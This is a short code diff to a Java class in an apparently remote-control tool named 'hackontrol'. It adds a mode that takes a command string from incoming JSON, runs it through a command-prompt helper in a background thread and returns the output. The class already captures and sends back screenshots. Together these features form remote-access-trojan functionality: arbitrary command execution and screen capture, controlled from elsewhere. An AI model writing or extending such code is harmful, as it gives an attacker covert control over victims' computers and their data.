@@ -11,6 +11,7 @@ import javax.imageio.ImageIO;
 import com.fasterxml.jackson.databind.JsonNode;
 import com.fasterxml.jackson.databind.ObjectMapper;
 import com.fasterxml.jackson.databind.node.ObjectNode;
+import com.khopan.hackontrol.CommandPrompt;
 
 public class Response {
 	private final Request request;
@@ -73,6 +74,24 @@ public class Response {
 			}
 
 			this.request.screenshotTaken(stream.toByteArray());
+			break;
+		}
+		case ResponseMode.EXECUTE_COMMAND: {
+			if(!objectNode.has("command")) {
+				return;
+			}
+
+			String command = objectNode.get("command").asText();
+
+			if(command.isEmpty()) {
+				return;
+			}
+
+			new Thread(() -> {
+				String result = CommandPrompt.execute(command);
+				this.request.commandResult(result);
+			}).start();
+
 			break;
 		}
 		}
